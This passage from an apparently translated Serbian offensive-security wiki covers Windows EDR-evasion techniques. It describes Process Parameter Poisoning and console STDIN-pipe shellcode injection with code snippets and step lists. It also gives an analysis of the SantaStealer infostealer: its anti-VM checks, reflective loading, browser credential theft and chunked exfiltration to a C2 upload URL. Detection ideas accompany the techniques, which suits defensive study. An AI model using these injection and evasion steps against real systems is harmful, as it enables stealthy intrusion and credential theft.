- Prednost dajte DLL-ovima koji su **već učitani** u udaljeni proces da biste izbegli telemetriju koju generišu `LoadLibrary`/neočekivana učitavanja image-a.
- Prednost dajte export-ima koje ciljna aplikacija retko izvršava; u suprotnom, uobičajeni tokovi koda mogu da naiđu na prepravljene bajtove pre ili posle kreiranja threada.
- Za velike implantate često je potrebno promeniti način ugrađivanja shellcode-a iz string literala u **inicijalizator niza bajtova/u vitičastim zagradama**, kako bi ceo bafer bio ispravno predstavljen u izvornom kodu injector-a.

Ideje za detekciju
- Udaljeni upisi u **izvršne stranice koje su podržane image-om** (`MEM_IMAGE`, `PAGE_EXECUTE*`), umesto u uobičajenije privatne RWX/RX alokacije.
- Ulazne tačke export-a čiji se bajtovi u memoriji više ne podudaraju sa sadržajem odgovarajuće datoteke na disku.
- Udaljeni thread-ovi ili preusmeravanja konteksta čije se izvršavanje započinje unutar export-a legitimnog DLL-a čiji su početni bajtovi nedavno izmenjeni.
- Sumnjivi nizovi poziva `VirtualProtect(Ex)` / `WriteProcessMemory` nad DLL `.text` stranicama, nakon kojih sledi kreiranje thread-a.

## Trovanje parametara procesa (P3)

Process Parameter Poisoning (P3) je tehnika **ubacivanja u proces / izbegavanja EDR-a** kojom se zaobilazi klasični put udaljenog upisivanja (`VirtualAllocEx` + `WriteProcessMemory`). Umesto kopiranja bajtova u već pokrenut ciljni proces, ona zloupotrebljava činjenicu da Windows **kopira izabrane početne parametre `CreateProcessW`-a у дете** и чува их унутар `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Prenosnici koji mogu da se zloupotrebe, a koje `CreateProcessW` kopira

Korisni prenosnici su:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (sa `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktična ograničenja prenosnika:

- `lpCommandLine` mora da pokazuje na **memoriju u koju može da se upisuje** za `CreateProcessW` i ograničen je na **32.767 Unicode znakova**, uključujući završni null znak.
- `lpEnvironment` mora da bude Unicode blok okruženja sa uzastopnim nizovima `NAME=VALUE\0`, završen dodatnim `\0`.
- `lpReserved` je zvanično rezervisan, pa mapiranje na `ShellInfo` treba smatrati detaljem implementacije, a ne stabilnim dokumentovanim ugovorom.

Time se uobičajeno kreiranje procesa pretvara u **primitiv za prenos payload-a**. Operator kreira dete-proces sa početnim podacima pod kontrolom napadača i prepušta Windows-u da obavi kopiranje između procesa.

### Tok udaljenog pronalaženja bez API-ja za udaljeno upisivanje

Nakon kreiranja deteta, pronađite kopirani bafer pomoću primitiva **samo za čitanje**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → dobijte `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Pročitajte udaljeni `PEB`
3. Pratite `PEB.ProcessParameters`
4. Pročitajte `RTL_USER_PROCESS_PARAMETERS`
5. Koristite izabrani pokazivač:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimalni tok:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Izvršavanje kopiranog bafera parametara

Kopirani region parametara je obično `RW`, a ne izvršiv. Uobičajeni P3 lanac je:

1. Kreirajte proces na uobičajen način (ne suspendovan)
2. Učinite izabranu stranicu parametara izvršivom pomoću `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponovo upotrebite ručicu glavne niti koja je već vraćena u `PROCESS_INFORMATION`
4. Preusmerite izvršavanje pomoću `NtSetContextThread` (`CONTEXT_CONTROL`, zamenite `RIP`)

Za razliku od klasičnih tokova rada za preuzimanje niti, ovo **ne zahteva** `SuspendThread` / `ResumeThread`; kontekst se može promeniti direktno preko vraćene ručice glavne niti.

Tako se izbegава nekoliko API-ja koji se često nadziru pri ubacivanju:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- често и `SuspendThread` / `ResumeThread`

### Ograničenje nul-bajta i staged shellcode

Sva tri nosača su **stringovni podaci ili podaci nalik stringovima**, pa se sirovi payload koji sadrži `0x00` skraćuje tokom prenosa. Praktično rešenje je **prva faza bez nul-bajtova** koja ponovo sastavlja konstante tokom izvršavanja, a zatim učitava proizvoljnu drugu fazu.

Jednostavan obrazac je sinteza konstanti zasnovana na XOR-u:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Ovo omogućava prvoj fazi da na steku sastavlja stringove, argumente API-ja, putanje do DLL-ova ili loader za shellcode druge faze, bez ugrađivanja null bajtova u preneti parametar.

### Pozivi API-ja sa steka iz prve faze

Kada prva faza mora da poziva API-je kao što je `LoadLibraryA`, može da:

- postavi string/bufer na stek ciljnog procesa
- rezerviše **32-bajtni x64 shadow space**
- postavi `RCX`, `RDX`, `R8`, `R9` na konstante ili pokazivače relativne u odnosu na `RSP`
- održi **16-bajtno poravnanje** `RSP` pre poziva

Zatim se druga faza može kopirati sa steka u alokaciju sa dozvolom `PAGE_READWRITE`, promeniti joj dozvolu u `PAGE_EXECUTE_READ` pomoću `VirtualProtect` i skočiti na nju, čime se izbegava direktna RWX alokacija.

### Ideje za detekciju

Autori navode sledeće dobre prilike za lov na pretnje:

- kada `VirtualProtectEx` / `NtProtectVirtualMemory` postavlja izvršne dozvole nad **stranicama parametara procesa**
- nakon te promene dozvola sledi `SetThreadContext` / `NtSetContextThread`
- udaljena čitanja `PEB`, a zatim `RTL_USER_PROCESS_PARAMETERS`
- neuobičajeno dugačke vrednosti ili vrednosti visoke entropije za `lpCommandLine`, `lpEnvironment` ili `STARTUPINFO.lpReserved` tokom kreiranja procesa

### Napomene

- P3 je **trik za prenos između procesa**, a ne samostalna primitiva za izvršavanje: kopiranom parametru i dalje je potrebna promena dozvola za izvršavanje i metoda za preusmeravanje izvršavanja.
- Autori su razmatrali `RtlCreateProcessReflection` / Dirty Vanity, ali su ga odbacili jer interno koristi sumnjive primitive kao što su `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## Ubrizgavanje preko konzolnog STDIN pipe-a

Interaktivni konzolni child proces može da se koristi i kao **primitiva za prenos payload-a**. Injector preusmerava standardni ulaz child procesa na pipe i šalje marker, a zatим shellcode. Nakon što konzolni program pročita podatke u sopstvenu privatnu memoriju, injector pronalazi taj bafer, daje mu dozvolu za izvršavanje i preusmerava nit child procesa na njega. Time se izbegavaju `VirtualAllocEx` i `WriteProcessMemory`, ali i dalje se radi o process injection-u, a ne o opštem EDR bypass-u.<sup>[[41]](#references)</sup>

Uprkos opisu „named-pipe“, referentna implementacija poziva `CreatePipe`, čime se kreira **anonymous pipe**. Windows interno implementira anonymous pipe-ove pomoću objekata pipe-a sa jedinstvenim imenima, ali PoC ne bira putanju `\\.\pipe\<name>` niti poziva `CreateNamedPipe`. Kreira nasleđene handle-ove sa podrazumevanim security descriptor-om, postavlja handle za čitanje u `STARTUPINFO.hStdInput`, postavlja `STARTF_USESTDHANDLES` i pokreće novi child proces uz omogućeno nasleđivanje handle-ova. Dakle, ovaj PoC pokreće navedenu konzolnu izvršnu datoteku; ne povezuje pipe sa postojećim procesom.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referentni tok rada

Implementacija koristi sledeći lanac:<sup>[[41]](#references)</sup>

1. Kreira parove anonymous pipe-ova za `STDIN` i `STDOUT` child procesa. Isključuje nasleđivanje na dva handle-a roditeljske strane i zatvara duplikate handle-ova dečje strane u roditeljskom procesu nakon kreiranja procesa.
2. Pokreće interaktivnu izvršnu datoteku, kao što su `netsh.exe` ili `nslookup.exe`, uz `CREATE_NEW_CONSOLE`. Child proces nasleđuje preusmerene standardne handle-ove.
3. Šalje kompletan binarni niz `rawData` pomoću `WriteFile` kroz handle `STDIN`-a roditeljske strane. Konzolni program obrađuje bajtove i ostavlja njihovu kopiju u jednom od svojih privatnih commit-ovanih regiona.
4. Prolazi kroz adresni prostor child procesa pomoću `VirtualQueryEx`, čita kandidate među `MEM_PRIVATE` regionima pomoću `ReadProcessMemory` i traži marker na početku niza `rawData`.
5. Menja dozvole otkrivenog bafera u `PAGE_EXECUTE_READWRITE` pomoću `VirtualProtectEx`.
6. Identifikuje glavnu nit, suspenduje je, postavlja `RIP` na `found_address + 0x19` pomoću `NtSetContextThread` i nastavlja njeno izvršavanje.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Dostavljena implementacija specifična je za x64: menja `CONTEXT.Rip`, a ugrađeni payload je x64 shellcode. `rawData` počinje markerom od 25 bajtova, tako da izvršni bajtovi počinju na heksadecimalnom pomeraju `0x19`. Pri zameni payload-a sačuvajte taj raspored ili istovremeno ažurirajte marker, vektor za pretragu, veličinu niza i pomeraj izvršavanja. Izvorni komentari takođe navode `0x0A`, `0x0D` i `0x1A` kao bad characters. Ovaj tok rada ne menja token ni privilegije child procesa.<sup>[[41]](#references)</sup>

Za male native pomoćne programe i obrasce za kompajliranje payload-a pogledajte [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Taktike SantaStealer-a za fileless izbegavanje detekcije i krađu kredencijala

SantaStealer (poznat i kao BluelineStealer) pokazuje kako savremeni infostealeri objedinjuju AV bypass, anti-analysis i pristup kredencijalima u jednom toku rada.<sup>[[24]](#references)</sup>

### Provera rasporeda tastature i odlaganje u sandbox-u

- Konfiguraciona zastavica (`anti_cis`) nabraja instalirane rasporede tastature pomoću funkcije `GetKeyboardLayoutList`. Ako se pronađe ćirilični raspored, uzorak kreira prazan marker `CIS` i prekida izvršavanje pre pokretanja stealera, čime se osigurava da se nikada ne aktivira u isključenim regionima, a pritom ostavlja artefakt za lov na pretnje.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Slojevita logika `check_antivm`

- Varijanta A prolazi kroz listu procesa, izračunava hash svakog imena pomoću prilagođene rolling checksum funkcije i poredi ga sa ugrađenim listama blokiranih debugger-a/sandbox-ova; ponavlja izračunavanje checksum-a nad imenom računara i proverava radne direktorijume kao što je `C:\analysis`.
- Varijanta B proverava svojstva sistema (minimalan broj procesa, nedavno vreme pokretanja), poziva `OpenServiceA("VBoxGuest")` da bi otkrila VirtualBox dodatke i obavlja vremenske provere oko pauza da bi otkrila izvršavanje korak po korak. Pri svakom poklapanju prekida se izvršavanje pre pokretanja modula.

### Fileless pomoćni modul + dvostruko ChaCha20 reflektivno učitavanje

- Primarni DLL/EXE sadrži Chromium pomoćni modul za prikupljanje akreditiva, koji se ili upisuje na disk ili se ručno mapira u memoriju; fileless režim sam razrešava importe/relokacije, pa se ne upisuju nikakve datoteke pomoćnog modula.
- Taj pomoćni modul čuva DLL druge faze dvostruko šifrovan pomoću ChaCha20 (dva ključa od 32 bajta + 12-bajtni nonce-ovi). Posle oba prolaza, reflektivno učitava blob (bez `LoadLibrary`) i poziva izvoze `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, izvedene iz [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Rutine ChromElevator koriste reflektivno process hollowing ubrizgavanje uz direct syscall u aktivan Chromium pregledač, nasleđuju AppBound Encryption ključeve i dešifruju lozinke/cookies/podatke kreditnih kartica direktno iz SQLite baza uprkos ABE hardening-u.

### Modularno prikupljanje u memoriji i HTTP eksfiltracija u delovima

- `create_memory_based_log` prolazi kroz globalnu tabelu pokazivača na funkcije `memory_generators` i pokreće jednu nit po uključenom modulu (Telegram, Discord, Steam, snimci ekrana, dokumenti, ekstenzije pregledača itd.). Svaka nit upisuje rezultate u deljene baferе i prijavljuje broj datoteka po isteku perioda čekanja od približno 45 sekundi.
- Po završetku, sve se arhivira pomoću statički povezane biblioteke `miniz` kao `%TEMP%\\Log.zip`. Zatim `ThreadPayload1` čeka 15 sekundi i šalje arhivu u delovima od 10 MB putem HTTP POST zahteva na `http://<C2>:6767/upload`, lažno predstavljajući granicu pregledača `multipart/form-data` (`----WebKitFormBoundary***`). Svaki deo sadrži `User-Agent: upload`, `auth: <build_id>`, opciono `w: <campaign_tag>`, a u poslednjem delu se dodaje `complete: true` kako bi C2 znao da je ponovno sastavljanje završeno.

## References

- [1] [Napredne tehnike izbegavanja: precizno Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Stekovi poziva: nema više besplatnog prolaza za malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentacija](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – primer](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – primer](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC za lažiranje steka poziva](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Novi lanac infekcije i obfuskacija zasnovana na ConfuserEx za DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Treba li verovati svom zero trust-u? Zaobilaženje Zscaler provera bezbednosnog stanja](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Pre ToolShell-a: Istraživanje prethodnih ransomware operacija grupe Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: zloupotreba prosleđenih izvoznih funkcija](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventar prosleđenih izvoznih funkcija u Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Redosled pretrage dinamički povezane biblioteke](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Bezbednost procesa i prava pristupa](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU referenca (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Pokretač CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Suprotstavljanje EDR-ovima uz zaštitu Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Probijanje zaštitnog omotača Windows Defender-a tehnikom preusmeravanja fascikli](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referenca za komandu mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Iza čiste zavese: od RAT-a do builder-a, pa do programera](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer stiže u grad: novi, ambiciozni infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Dešifrovanje Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: suzbijanje Node.js malware-a pomoću API praćenja](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Uspavana lepotica: uspavljivanje Adaptix-a pomoću Crystal Palace-a](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Trovanje procesnih parametara](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Uspavana lepotica II: CFG, CET i lažiranje steka](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Sakrivanje .NET ETW-a](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Zloupotreba Chrome Remote Desktop-a u Red Team operacijama: praktični vodič](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: pretvaranje Defender-ovog drajvera za sanaciju u primitivnu operaciju na kernelu](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Prateći kod za MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: izrada funkcija koje se same maskiraju pomoću LLVM-a](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - izvorni kod za InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Funkcija CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Kreiranje podređenog procesa sa preusmerenim ulazom i izlazom](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
